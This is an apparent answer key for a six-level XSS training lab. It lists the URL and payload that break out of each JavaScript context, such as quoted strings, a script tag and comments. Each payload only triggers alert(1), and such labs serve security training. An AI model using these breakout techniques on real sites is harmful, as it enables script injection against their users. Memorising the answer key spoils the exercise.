# injs — solutions

Reflection inside a `<script>` block — JS variable, string, or comment context.

### injs-xss-level1

`/injs/level1/?query=alert(1)`

- payload: `alert(1)`
- context: raw JS expression: `var data = QUERY;`

### injs-xss-level2

`/injs/level2/?query=%27;alert(1);//`

- payload: `';alert(1);//`
- context: inside `var data = '...';` — break out of single-quoted string

### injs-xss-level3

`/injs/level3/?query=%22;alert(1);//`

- payload: `";alert(1);//`
- context: inside `var data = "...";` — break out of double-quoted string

### injs-xss-level4

`/injs/level4/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: `'` stripped — escape via closing the script tag

### injs-xss-level5

`/injs/level5/?query=*/alert(1);/*`

- payload: `*/alert(1);/*`
- context: inside `/* ... */` block comment — close it then inject JS

### injs-xss-level6

`/injs/level6/?query=%0Aalert(1)`

- payload: `\nalert(1)` (literal newline)
- context: inside `// ...` line comment — newline ends the comment
